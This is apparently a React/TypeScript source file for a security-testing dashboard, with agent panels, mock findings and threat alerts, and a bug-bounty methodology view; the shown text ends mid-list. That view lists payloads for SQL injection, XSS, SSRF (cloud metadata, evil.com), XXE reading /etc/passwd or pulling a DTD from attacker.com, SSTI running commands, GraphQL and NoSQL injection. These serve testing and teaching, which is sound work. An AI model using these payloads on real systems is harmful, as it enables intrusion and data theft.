    setPhase5Output('Initializing Phase 5 agent...')

    try {

      const res = await    fetch(`/api/projects/${projectId}/agents/${agentType.replace(/_/g, '-')}`, {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({ action: 'analyze', input_data: { scope: 'full' } }),

      })

      const data = await res.json()

      setPhase5Output(JSON.stringify(data, null, 2))

    } catch (e) {

      setPhase5Output(`Error: ${e}`)

    } finally {

      setRunningPhase5(null)

    }

  }



  return (

    <div>

      {/* Phase 5 Agent Selection */}

      <div style={{ 

        background: 'linear-gradient(135deg, rgba(255, 136, 68, 0.1), rgba(255, 68, 136, 0.05))',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255, 136, 68, 0.2)',

        marginBottom: '24px'

      }}>

        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>

          <span style={{ fontSize: '24px' }}>🚀</span>

          <div>

            <h3 style={{ fontSize: '18px', fontWeight: 'bold', background: 'linear-gradient(90deg, #ff8844, #ff4488)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>

              Phase 5 Security Suite

            </h3>

            <p style={{ fontSize: '12px', color: '#666' }}>Advanced threat hunting, operations, and defense automation</p>

          </div>

        </div>



        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '12px' }}>

          {phase5Agents.map(agent => (

            <button

              key={agent.id}

              onClick={() => { onSelectAgent(agent.id); runPhase5Agent(agent.id) }}

              disabled={runningPhase5 !== null}

              style={{

                background: selectedAgent === agent.id 

                  ? `${agent.color}20` 

                  : 'rgba(0,0,0,0.3)',

                border: `1px solid ${selectedAgent === agent.id ? agent.color : 'rgba(255,255,255,0.1)'}`,

                borderRadius: '12px',

                padding: '16px',

                cursor: runningPhase5 ? 'not-allowed' : 'pointer',

                opacity: runningPhase5 && selectedAgent !== agent.id ? 0.5 : 1,

                transition: 'all 0.2s',

                textAlign: 'center'

              }}

            >

              <div style={{ fontSize: '24px', marginBottom: '8px' }}>{agent.name.split(' ')[0]}</div>

              <div style={{ fontSize: '12px', fontWeight: '600', color: agent.color }}>{agent.name.split(' ').slice(1).join(' ')}</div>

              <div style={{ fontSize: '10px', color: '#666', marginTop: '4px' }}>{agent.description.split(',')[0]}</div>

            </button>

          ))}

        </div>

      </div>



      {/* Phase 5 Details for Selected Agent */}

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>

        {/* Agent Info */}

        <div style={{ 

          background: 'rgba(15, 15, 26, 0.95)',

          borderRadius: '16px',

          padding: '24px',

          border: '1px solid rgba(255,255,255,0.05)'

        }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>

            {phase5Agents.find(a => a.id === selectedAgent)?.name || 'Select Agent'}

          </h3>

          <p style={{ fontSize: '13px', color: '#666', marginBottom: '16px' }}>

            {phase5Agents.find(a => a.id === selectedAgent)?.description}

          </p>

          

          <div style={{ 

            background: 'rgba(0,0,0,0.3)', 

            borderRadius: '8px', 

            padding: '16px',

            marginBottom: '16px'

          }}>

            <h4 style={{ fontSize: '13px', fontWeight: '600', marginBottom: '12px', color: '#888' }}>Capabilities</h4>

            {getPhase5Capabilities(selectedAgent).map((cap, i) => (

              <div key={i} style={{

                display: 'flex',

                alignItems: 'center',

                gap: '8px',

                marginBottom: '8px',

                fontSize: '13px',

                color: '#aaa'

              }}>

                <span style={{ color: '#00ff88' }}>✓</span> {cap}

              </div>

            ))}

          </div>



          <button

            onClick={() => runPhase5Agent(selectedAgent)}

            disabled={runningPhase5 !== null}

            style={{

              width: '100%',

              background: runningPhase5 

                ? 'rgba(255,255,255,0.1)' 

                : 'linear-gradient(135deg, #ff8844, #ff4488)',

              color: runningPhase5 ? '#666' : '#fff',

              border: 'none',

              borderRadius: '10px',

              padding: '14px',

              fontWeight: '700',

              cursor: runningPhase5 ? 'not-allowed' : 'pointer',

              fontSize: '14px'

            }}

          >

            {runningPhase5 ? '⏳ Running...' : '▶ Run Analysis'}

          </button>

        </div>



        {/* Output */}

        <div style={{ 

          background: 'rgba(10, 10, 15, 0.95)',

          borderRadius: '16px',

          padding: '24px',

          border: '1px solid rgba(255,255,255,0.05)'

        }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Analysis Output</h3>

          <div style={{

            minHeight: '300px',

            maxHeight: '400px',

            overflow: 'auto',

            fontFamily: 'monospace',

            fontSize: '12px',

            color: '#00ff88',

            background: 'rgba(0,0,0,0.3)',

            borderRadius: '8px',

            padding: '16px',

            whiteSpace: 'pre-wrap'

          }}>

            {phase5Output || 'Run an agent to see output here...'}

          </div>

        </div>

      </div>

    </div>

  )

}



function getPhase5Capabilities(agentId: string): string[] {

  switch(agentId) {

    case 'threat_intelligence':

      return ['YARA rule scanning', 'IOC enrichment', 'Threat actor tracking', 'VirusTotal integration', 'Malware analysis']

    case 'security_operations':

      return ['SIEM log analysis', 'SOAR playbook execution', 'Event correlation', 'Incident management', 'Alert triage']

    case 'adaptive_defense':

      return ['ML anomaly detection', 'Behavioral analysis', 'Self-healing automation', 'Threat feed integration', 'Real-time blocking']

    case 'supply_chain':

      return ['SBOM generation', 'Dependency graph analysis', 'License compliance', 'CVE vulnerability scanning', 'Provenance tracking']

    case 'api_security':

      return ['OpenAPI/GraphQL analysis', 'Authentication testing', 'Authorization bypass', 'Rate limiting validation', 'Fuzzing automation']

    default:

      return []

  }

}



// ============ FINDINGS PANEL ============

function FindingsPanel() {

  const [findings] = useState<Finding[]>([

    { id: '1', type: 'sql_injection', severity: 'critical', title: 'SQL Injection in User Query', description: 'User input directly concatenated into SQL query', location: 'src/handlers/user.py:45', cwe: 'CWE-89', owasp: ['A1', 'A3'] },

    { id: '2', type: 'xss', severity: 'high', title: 'Cross-Site Scripting (XSS)', description: 'Unsanitized user input rendered without encoding', location: 'src/views/home.html:23', cwe: 'CWE-79', owasp: ['A7'] },

    { id: '3', type: 'auth', severity: 'high', title: 'Weak Authentication Mechanism', description: 'Missing rate limiting on login endpoint', location: 'src/auth/login.py:12', cwe: 'CWE-307', owasp: ['A2'] },

    { id: '4', type: 'crypto', severity: 'medium', title: 'Weak Cryptographic Hash', description: 'Using MD5 for password hashing', location: 'src/auth/password.py:8', cwe: 'CWE-328', owasp: ['A3'] },

  ])



  const severityColors: Record<string, string> = {

    critical: '#ff4444',

    high: '#ff8844',

    medium: '#ffaa00',

    low: '#00d4ff',

    info: '#888'

  }



  return (

    <div>

      <div style={{ 

        background: 'rgba(15, 15, 26, 0.95)',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255,255,255,0.05)',

        marginBottom: '24px'

      }}>

        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Filters</h3>

        <div style={{ display: 'flex', gap: '12px' }}>

          {['All', 'Critical', 'High', 'Medium', 'Low'].map(filter => (

            <button key={filter} style={{

              background: filter === 'All' ? 'rgba(0, 212, 255, 0.1)' : 'rgba(255,255,255,0.05)',

              border: `1px solid ${filter === 'All' ? '#00d4ff' : 'rgba(255,255,255,0.1)'}`,

              color: filter === 'All' ? '#00d4ff' : '#888',

              padding: '8px 16px',

              borderRadius: '6px',

              cursor: 'pointer',

              fontSize: '12px'

            }}>

              {filter}

            </button>

          ))}

        </div>

      </div>



      <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>

        {findings.map(finding => (

          <div key={finding.id} style={{

            background: 'rgba(15, 15, 26, 0.95)',

            borderRadius: '12px',

            padding: '20px',

            border: `1px solid ${severityColors[finding.severity]}30`,

            borderLeft: `4px solid ${severityColors[finding.severity]}`

          }}>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '8px' }}>

              <h4 style={{ fontSize: '15px', fontWeight: '600' }}>{finding.title}</h4>

              <span style={{

                background: `${severityColors[finding.severity]}20`,

                color: severityColors[finding.severity],

                fontSize: '11px',

                fontWeight: '600',

                padding: '4px 8px',

                borderRadius: '4px',

                textTransform: 'uppercase'

              }}>

                {finding.severity}

              </span>

            </div>

            <p style={{ fontSize: '13px', color: '#888', marginBottom: '12px' }}>{finding.description}</p>

            <div style={{ display: 'flex', gap: '16px', fontSize: '12px', color: '#666' }}>

              <span>📍 {finding.location}</span>

              <span>🔗 {finding.cwe}</span>

              {finding.owasp && <span>📋 OWASP: {finding.owasp.join(', ')}</span>}

            </div>

          </div>

        ))}

      </div>

    </div>

  )

}



// ============ AGENTS PANEL ============

function AgentsPanel({ runningAgent, onRunAgent, output }: { 

  runningAgent: string | null;

  onRunAgent: (agent: string, action: string, data: any) => void;

  output: string;

}) {

  const agents = [

    { id: 'recon', name: '🎯 Recon Agent', description: 'Target discovery, port scanning, OSINT', color: '#00d4ff' },

    { id: 'code-review', name: '🔍 Code Review Agent', description: 'SAST with security pattern detection', color: '#00ff88' },

    { id: 'threat-modeling', name: '🛡️ Threat Modeling Agent', description: 'Attack path analysis using knowledge graph', color: '#ff8844' },

    { id: 'dependency', name: '📦 Dependency Agent', description: 'Vulnerability scanning for dependencies', color: '#aa88ff' },

    { id: 'debate', name: '⚖️ Debate Engine', description: '5-role adversarial finding validation', color: '#ffaa00' },

  ]

  

  return (

    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>

      {/* Agent Cards */}

      <div>

        <h3 style={{ fontSize: '18px', marginBottom: '16px' }}>Phase 3 Agents</h3>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>

          {agents.map(agent => (

            <div key={agent.id} style={{

              background: 'rgba(15, 15, 26, 0.95)',

              border: `1px solid ${agent.color}40`,

              borderRadius: '12px',

              padding: '16px',

              cursor: runningAgent ? 'not-allowed' : 'pointer',

              opacity: runningAgent ? 0.6 : 1,

              transition: 'all 0.2s',

            }}

            onClick={() => !runningAgent && onRunAgent(agent.id, 'discover', { scope: { domains: ['example.com'] } })}

            onMouseEnter={(e) => {

              if (!runningAgent) {

                e.currentTarget.style.borderColor = agent.color

                e.currentTarget.style.transform = 'translateX(4px)'

              }

            }}

            onMouseLeave={(e) => {

              e.currentTarget.style.borderColor = `${agent.color}40`

              e.currentTarget.style.transform = 'translateX(0)'

            }}>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>

                <div style={{ fontSize: '16px', fontWeight: '600', color: agent.color }}>{agent.name}</div>

                {runningAgent === agent.id && (

                  <span style={{ fontSize: '12px', color: '#888', animation: 'pulse 1s infinite' }}>Running...</span>

                )}

              </div>

              <p style={{ fontSize: '12px', color: '#666', marginTop: '4px' }}>{agent.description}</p>

            </div>

          ))}

        </div>

        

        <div style={{ marginTop: '16px', padding: '12px', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px', fontSize: '12px', color: '#00d4ff' }}>

          💡 Click an agent to run it with default parameters. Results will appear in the output panel.

        </div>

      </div>

      

      {/* Agent Output */}

      <div>

        <h3 style={{ fontSize: '18px', marginBottom: '16px' }}>Agent Output</h3>

        <div style={{

          background: 'rgba(10, 10, 15, 0.95)',

          border: '1px solid rgba(255,255,255,0.05)',

          borderRadius: '12px',

          padding: '16px',

          minHeight: '400px',

          maxHeight: '500px',

          overflow: 'auto',

          fontFamily: 'monospace',

          fontSize: '12px',

          whiteSpace: 'pre-wrap',

          color: output.includes('error') || output.includes('Error') ? '#ff4444' : '#00ff88',

        }}>

          {output || 'Run an agent to see output here...'}

        </div>

      </div>

    </div>

  )

}



// ============ ANALYSIS PANEL ============

function AnalysisPanel({ projectId }: { projectId: string }) {

  const [analysisResult, setAnalysisResult] = useState<any>(null)

  const [codeInput, setCodeInput] = useState('// Paste vulnerable code here\nconst query = "SELECT * FROM users WHERE id = " + userId;')

  const [isAnalyzing, setIsAnalyzing] = useState(false)

  

  const runCodeAnalysis = async () => {

    setIsAnalyzing(true)

    try {

      const res = await fetch(`/api/projects/${projectId}/analyze/code`, {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({ code: codeInput, file_path: 'example.js', language: 'javascript' }),

      })

      const data = await res.json()

      setAnalysisResult(data)

    } catch (e) {

      console.error('Analysis failed:', e)

    } finally {

      setIsAnalyzing(false)

    }

  }

  

  return (

    <div>

      <h3 style={{ fontSize: '18px', marginBottom: '16px' }}>🔍 Code Analysis (SAST)</h3>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>

        <div>

          <textarea

            value={codeInput}

            onChange={(e) => setCodeInput(e.target.value)}

            style={{

              width: '100%',

              minHeight: '350px',

              background: 'rgba(10, 10, 15, 0.95)',

              border: '1px solid rgba(255,255,255,0.05)',

              borderRadius: '12px',

              padding: '16px',

              color: '#00d4ff',

              fontFamily: 'monospace',

              fontSize: '13px',

              resize: 'vertical',

              outline: 'none'

            }}

            placeholder="Paste code to analyze..."

          />

          <button 

            onClick={runCodeAnalysis} 

            disabled={isAnalyzing}

            style={{

              marginTop: '16px',

              width: '100%',

              background: isAnalyzing 

                ? 'rgba(255,255,255,0.1)' 

                : 'linear-gradient(135deg, #00d4ff, #00ff88)',

              color: isAnalyzing ? '#666' : '#000',

              border: 'none',

              borderRadius: '10px',

              padding: '14px',

              fontWeight: '700',

              cursor: isAnalyzing ? 'not-allowed' : 'pointer',

              fontSize: '14px'

            }}>

            {isAnalyzing ? '⏳ Analyzing...' : '▶ Analyze Code'}

          </button>

        </div>

        

        <div style={{ 

          background: 'rgba(15, 15, 26, 0.95)', 

          borderRadius: '12px', 

          padding: '20px', 

          border: '1px solid rgba(255,255,255,0.05)',

          minHeight: '350px'

        }}>

          <h4 style={{ fontSize: '14px', marginBottom: '16px', color: '#888' }}>Analysis Results</h4>

          {analysisResult ? (

            <div style={{ fontFamily: 'monospace', fontSize: '12px' }}>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: '12px', marginBottom: '16px' }}>

                <div style={{ background: 'rgba(0,0,0,0.3)', padding: '12px', borderRadius: '8px' }}>

                  <div style={{ color: '#666', marginBottom: '4px' }}>Patterns Found</div>

                  <div style={{ fontSize: '24px', fontWeight: 'bold', color: '#00d4ff' }}>{analysisResult.summary?.patterns_found || 0}</div>

                </div>

                <div style={{ background: 'rgba(0,0,0,0.3)', padding: '12px', borderRadius: '8px' }}>

                  <div style={{ color: '#666', marginBottom: '4px' }}>Critical Issues</div>

                  <div style={{ fontSize: '24px', fontWeight: 'bold', color: '#ff4444' }}>{analysisResult.summary?.critical || 0}</div>

                </div>

              </div>

              

              {analysisResult.patterns?.length > 0 && (

                <div style={{ marginTop: '16px' }}>

                  <div style={{ fontSize: '12px', color: '#666', marginBottom: '8px' }}>Vulnerabilities:</div>

                  {analysisResult.patterns.map((p: any, i: number) => (

                    <div key={i} style={{

                      background: 'rgba(0,0,0,0.3)',

                      padding: '12px',

                      borderRadius: '8px',

                      marginBottom: '8px',

                      borderLeft: `3px solid ${p.severity === 'critical' ? '#ff4444' : p.severity === 'high' ? '#ff8844' : '#ffaa00'}`

                    }}>

                      <div style={{ fontWeight: '600', color: '#fff', marginBottom: '4px' }}>{p.name}</div>

                      <div style={{ fontSize: '11px', color: '#666' }}>{p.description}</div>

                    </div>

                  ))}

                </div>

              )}

            </div>

          ) : (

            <div style={{ color: '#666', fontSize: '13px', textAlign: 'center', paddingTop: '100px' }}>

              Run analysis to see results

            </div>

          )}

        </div>

      </div>

    </div>

  )

}



// ============ THREAT HUNT VIEW ============

function _ThreatHuntView() {

  const [alerts] = useState<ThreatAlert[]>([

    { id: '1', type: 'malware', severity: 'critical', title: 'Suspicious PowerShell Execution', description: 'Base64 encoded command detected in process creation', timestamp: new Date().toISOString(), iocs: ['192.168.1.105', 'malware.exe'], yara_matches: ['meterpreter', 'covenant'] },

    { id: '2', type: 'network', severity: 'high', title: 'C2 Communication Detected', description: 'Beaconing behavior to known malicious IP', timestamp: new Date(Date.now() - 300000).toISOString(), iocs: ['185.220.101.34'], yara_matches: ['apt_threat'] },

    { id: '3', type: 'anomaly', severity: 'medium', title: 'Unusual Login Pattern', description: 'Login from multiple geographies within 1 hour', timestamp: new Date(Date.now() - 600000).toISOString(), iocs: [], yara_matches: [] },

  ])



  return (

    <div>

      {/* Threat Intel Stats */}

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '24px' }}>

        <StatCard label="Active IOCs" value="47" icon="🎯" color="#ff4444" trend="+12" />

        <StatCard label="YARA Rules" value="156" icon="📜" color="#aa88ff" />

        <StatCard label="Threat Feeds" value="8" icon="📡" color="#00d4ff" />

        <StatCard label="IOC Matches" value="3" icon="⚠️" color="#ffaa00" />

      </div>



      {/* Actions */}

      <div style={{ 

        background: 'rgba(15, 15, 26, 0.95)',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255,255,255,0.05)',

        marginBottom: '24px'

      }}>

        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Threat Hunting Actions</h3>

        <div style={{ display: 'flex', gap: '12px' }}>

          <button style={{

            background: 'linear-gradient(135deg, rgba(255, 68, 68, 0.2), rgba(255, 68, 68, 0.1))',

            border: '1px solid #ff4444',

            color: '#ff4444',

            padding: '12px 20px',

            borderRadius: '8px',

            cursor: 'pointer',

            fontSize: '13px',

            fontWeight: '600'

          }}>

            🔍 Scan for IOCs

          </button>

          <button style={{

            background: 'rgba(255,255,255,0.05)',

            border: '1px solid rgba(255,255,255,0.1)',

            color: '#888',

            padding: '12px 20px',

            borderRadius: '8px',

            cursor: 'pointer',

            fontSize: '13px'

          }}>

            📜 Deploy YARA Rules

          </button>

          <button style={{

            background: 'rgba(255,255,255,0.05)',

            border: '1px solid rgba(255,255,255,0.1)',

            color: '#888',

            padding: '12px 20px',

            borderRadius: '8px',

            cursor: 'pointer',

            fontSize: '13px'

          }}>

            📊 Enrich from VirusTotal

          </button>

        </div>

      </div>



      {/* Active Alerts */}

      <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px', color: '#888' }}>Active Alerts</h3>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>

        {alerts.map(alert => (

          <div key={alert.id} style={{

            background: 'rgba(15, 15, 26, 0.95)',

            borderRadius: '12px',

            padding: '20px',

            border: `1px solid ${alert.severity === 'critical' ? '#ff4444' : alert.severity === 'high' ? '#ff8844' : '#ffaa00'}30`

          }}>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '8px' }}>

              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>

                <span style={{ fontSize: '20px' }}>{alert.type === 'malware' ? '🦠' : alert.type === 'network' ? '🌐' : '⚠️'}</span>

                <h4 style={{ fontSize: '15px', fontWeight: '600' }}>{alert.title}</h4>

              </div>

              <span style={{

                background: `${alert.severity === 'critical' ? '#ff4444' : alert.severity === 'high' ? '#ff8844' : '#ffaa00'}20`,

                color: alert.severity === 'critical' ? '#ff4444' : alert.severity === 'high' ? '#ff8844' : '#ffaa00',

                fontSize: '11px',

                fontWeight: '600',

                padding: '4px 8px',

                borderRadius: '4px',

                textTransform: 'uppercase'

              }}>

                {alert.severity}

              </span>

            </div>

            <p style={{ fontSize: '13px', color: '#888', marginBottom: '12px' }}>{alert.description}</p>

            <div style={{ display: 'flex', gap: '16px', fontSize: '12px' }}>

              <span style={{ color: '#666' }}>🕐 {new Date(alert.timestamp).toLocaleString()}</span>

              {alert.iocs && alert.iocs.length > 0 && (

                <span style={{ color: '#00d4ff' }}>📍 IOCs: {alert.iocs.join(', ')}</span>

              )}

              {alert.yara_matches && alert.yara_matches.length > 0 && (

                <span style={{ color: '#aa88ff' }}>📜 YARA: {alert.yara_matches.join(', ')}</span>

              )}

            </div>

          </div>

        ))}

      </div>

    </div>

  )

}



// ============ OWASP TOP 10:2025 KNOWLEDGE VIEW ============

// ============ BUG BOUNTY METHODOLOGY VIEW ============

function _BugBountyView() {

  const [selectedVuln, setSelectedVuln] = useState<string | null>(null)

  

  const vulnCategories = [

    { 

      id: 'sql_injection', 

      name: 'SQL Injection', 

      icon: '💉', 

      color: '#ff4444', 

      severity: 'critical',

      description: 'Untrusted data sent to SQL interpreter. Allows data exfiltration, authentication bypass, or remote code execution.',

      bounties: 'Critical: $5,000-$50,000+',

      payloads: [

        "' OR '1'='1",

        "' OR '1'='1' --",

        "1' ORDER BY 1--",

        "1' UNION SELECT NULL--",

        "'; DROP TABLE users; --",

        "1' AND 1=1--",

        "' OR 1=1 LIMIT 1--",

        "admin'--",

        "1' INTO OUTFILE '/tmp/test.txt'--"

      ],

      detection: [

        'Error-based: Look for SQL errors in response',

        'Boolean-based: Change true/false conditions',

        'Time-based: Use sleep() or benchmark()',

        'Union-based: Extend query results'

      ],

      realReports: [

        { program: 'Nextcloud', title: 'SQL Injection in Column Type Parameter', bounty: '$0 (70 upvotes)', link: 'hackerone.com/reports/3462991' },

        { program: 'AWS VDP', title: 'SQL Injection Detection Bypass in AWS WAF', bounty: '$0 (36 upvotes)', link: 'hackerone.com/reports/3591725' }

      ]

    },

    { 

      id: 'xss', 

      name: 'Cross-Site Scripting (XSS)', 

      icon: '🦠', 

      color: '#ff8844', 

      severity: 'high',

      description: 'Invalidated user input executed as code in browser. Steals sessions, defaces sites, or redirects users.',

      bounties: 'High: $1,000-$10,000',

      payloads: [

        '<script>alert(document.domain)</script>',

        '<img src=x onerror=alert(1)>',

        '<svg onload=alert(1)>',

        '<iframe src=javascript:alert(1)>',

        '<body onload=alert(1)>',

        'javascript:alert(document.domain)',

        '#\"><img src=x onerror=alert(1)>',

        '<details open ontoggle=alert(1)>',

        '<script>debugger;</script>'

      ],

      detection: [

        'Reflected: URL parameters reflected in response',

        'Stored: Input saved and displayed later',

        'DOM-based: Client-side JavaScript processes input',

        'Universal: Any vector can trigger XSS'

      ],

      realReports: [

        { program: 'Basecamp', title: 'DOM XSS in fizzy.do import filename preview', bounty: '$500 (67 upvotes)', link: 'hackerone.com/reports/3608199' },

        { program: 'Nextcloud', title: 'Stored XSS in attachment-display', bounty: '$0 (36 upvotes)', link: 'hackerone.com/reports/3594137' }

      ]

    },

    { 

      id: 'idor', 

      name: 'IDOR (Insecure Direct Object Reference)', 

      icon: '🔓', 

      color: '#ffaa00', 

      severity: 'high',

      description: 'Direct access to objects without authorization check. Users can access other users\' data.',

      bounties: 'High: $1,000-$15,000',

      payloads: [

        'Change IDs in URL: /api/users/123 → /api/users/124',

        'POST ID manipulation: {"user_id": 124}',

        'UUID enumeration instead of sequential IDs',

        'HTTP parameter pollution: user_id=123&user_id=124'

      ],

      detection: [

        'Find resource identifiers (IDs, UUIDs)',

        'Test if authorization is enforced',

        'Check for predictable sequential IDs',

        'Look for horizontal privilege escalation'

      ],

      realReports: [

        { program: 'GitHub', title: 'Cross-repository IDOR in bypass_reviewers', bounty: '$0 (50 upvotes)', link: 'hackerone.com/reports/3560256' },

        { program: 'Nextcloud', title: 'BOLA/IDOR in Out-of-Office API', bounty: '$0 (34 upvotes)', link: 'hackerone.com/reports/3382343' },

        { program: 'Rocket.Chat', title: 'IDOR: autotranslate Full Message Content Leak', bounty: '$0 (30 upvotes)', link: 'hackerone.com/reports/3713682' }

      ]

    },

    { 

      id: 'ssrf', 

      name: 'Server-Side Request Forgery (SSRF)', 

      icon: '🌐', 

      color: '#00d4ff', 

      severity: 'critical',

      description: 'Server forced to make requests to unintended destinations. Access internal services, cloud metadata.',

      bounties: 'Critical: $5,000-$30,000',

      payloads: [

        'http://localhost/admin',

        'http://127.0.0.1:8500/v2/_catalog',

        'http://169.254.169.254/latest/meta-data/',

        'http://metadata.google.internal/',

        'file:///etc/passwd',

        'gopher://127.0.0.1:6379/_INFO',

        'http://0.0.0.0:8080',

        '64:ff9b::1/static/',

        'http://[::]:80/',

        'http://[0000::1]:80/',

        'http://0177.0.0.1/',

        'http://2130706433/',

        'http://0x7f000001/',

        'http://127.127.127.127',

        'dict://localhost:11211/%0astats%0aquit',

        'sftp://evil.com:11111/',

        'tftp://evil.com:12346/TEST'

      ],

      detection: [

        'Find URL parameters accepting URLs',

        'Test internal endpoints (localhost, 169.254)',

        'Use DNS rebinding techniques',

        'Check for file:// protocol support',

        'Test URL parser discrepancies',

        'Check for LDAP, gopher, dict protocols'

      ],

      realReports: [

        { program: 'Nextcloud', title: 'Unauthenticated SSRF via Public Reference API', bounty: '$0 (40 upvotes)', link: 'hackerone.com/reports/3479692' },

        { program: 'arkadiyt-projects', title: 'SSRF Filter Bypass via NAT64 IPv6 Prefix', bounty: '$0 (60 upvotes)', link: 'hackerone.com/reports/3634400' }

      ]

    },

    { 

      id: 'xxe', 

      name: 'XML External Entity (XXE)', 

      icon: '📄', 

      color: '#ff4488', 

      severity: 'critical',

      description: 'XML parser fetches external entities. File read, SSRF, denial of service possible.',

      bounties: 'Critical: $5,000-$40,000',

      payloads: [

        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',

        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',

        '<!DOCTYPE data [<!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">]>', // Billion laughs

        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>',

        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',

        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300"><image xlink:href="expect://ls"/></svg>',

        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://attacker.com/dtd.xml"> %sp;]><r>&exfil;</r>',

        '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/"> %dtd;]><xxx/>]]></foo></soap:Body>'

      ],

      detection: [

        'Send XML input with external entity reference',

        'Check if parser resolves SYSTEM entities',

        'Test error-based exfiltration',

        'Blind XXE via out-of-band detection',

        'Try PHP wrapper filter://'

      ],

      realReports: [

        { program: 'Shopify', title: 'XXE vulnerability in Checkout', bounty: '$0 (45 upvotes)', link: 'hackerone.com/reports/3452696' },

        { program: 'Uber', title: 'Blind XXE in UBER.com', bounty: '$0 (26 upvotes)', link: 'hackerone.com/reports/3426952' }

      ]

    },

    { 

      id: 'ssti', 

      name: 'Server-Side Template Injection', 

      icon: '⚙️', 

      color: '#cc88ff', 

      severity: 'critical',

      description: 'User input embedded in template engine. Remote code execution in Jinja2, Twig, Freemarker.',

      bounties: 'Critical: $5,000-$50,000',

      payloads: [

        '{{7*7}}',

        '{{config}}',

        '${7*7}',

        '${T(SYSTEM)}',

        '{{request|attr("application")}}',

        '{{[]|class.__bases__[0].__subclasses__()}}',

        '{% for x in ().__class__.__base__.__subclasses__() %}{{x()}}{% endfor %}',

        '{{config.__class__.__init__.__globals__.__builtins__}}',

        '${class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("whoami")}',

        '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("whoami")}'

      ],

      detection: [

        'Inject {{7*7}} - if 49 rendered, SSTI confirmed',

        'Test for code execution: {{config}}',

        'Check for class introspection',

        'Try {{request|attr()}} for Jinja2',

        'Use ${} for Spring/Handlebars'

      ],

      realReports: [

        { program: 'Uber', title: "SSTI in Uber's website", bounty: '$0 (89 upvotes)', link: 'hackerone.com/reports/3426952' },

        { program: 'Shopify', title: "SSTI in Shopify Email", bounty: '$0 (60 upvotes)', link: 'hackerone.com/reports/3591725' }

      ]

    },

    { 

      id: 'graphql', 

      name: 'GraphQL Injection', 

      icon: '🔀', 

      color: '#88ddff', 

      severity: 'high',

      description: 'GraphQL API attacks: introspection abuse, query batching, SQL/NoSQL injection through GraphQL.',

      bounties: 'High: $2,000-$25,000',

      payloads: [

        '{__schema{types{name}}}',

        '__schema{queryType{name}mutationType{name}types{kind,name}}',

        '{__type(name:"User"){name fields{name type{name}}}}',

        'mutation{signIn(login:"Admin", password:"secret"){token}}',

        `{"query":"{ user(id: '1') { name } }"}`,

        `{"query":"{ doctors(search: {$regex:.*,lastName:Admin}) { firstName } }"}`,

        `[

          {"query":"mutation{login(pass:1111,username:\\"bob\\")}"},

          {"query":"mutation{login(pass:2222,username:\\"bob\\")}"}

        ]`,

        `{"query":"query{user(name:patt';SELECT 1)--){id email}}"}`

      ],

      detection: [

        'Try introspection: __schema',

        'Test for aliases/batching',

        'Send single quote in parameters',

        'Check for SQL/NoSQL injection through GraphQL',

        'Look for IDOR through nested queries'

      ],

      realReports: [

        { program: 'HackerOne', title: 'GraphQL Introspection enabled', bounty: '$0 (45 upvotes)', link: 'hackerone.com/reports/435066' },

        { program: 'Depop', title: 'GraphQL injection leads to Information Disclosure', bounty: '$0 (78 upvotes)', link: 'hackerone.com/reports/3525782' }

      ]

    },

    { 

      id: 'nosql', 

      name: 'NoSQL Injection', 

      icon: '🍃', 

      color: '#00ff88', 

      severity: 'critical',

      description: 'MongoDB, Redis, CouchDB injection through operators like $gt, $where, $regex.',

      bounties: 'Critical: $3,000-$25,000',

      payloads: [

        '{"$gt": ""}',

        '{"$where": "1=1"}',

        '{"$regex": ".*"}',

        '{"login": {"$ne": null}}',

        '{"$gt": 0, "$exists": true}',

        '{"username": {"$in": ["admin"]}}',

        '{"password": {"$regex": "^admin"}}',

        '{"$expr": {"$gt": [1, 1]}}',

        '{"$lookup": {"from": "users", "pipeline": [{"$match": {"$expr": {"$eq": ["$username", "$user"]}}}]}}'

      ],

      detection: [

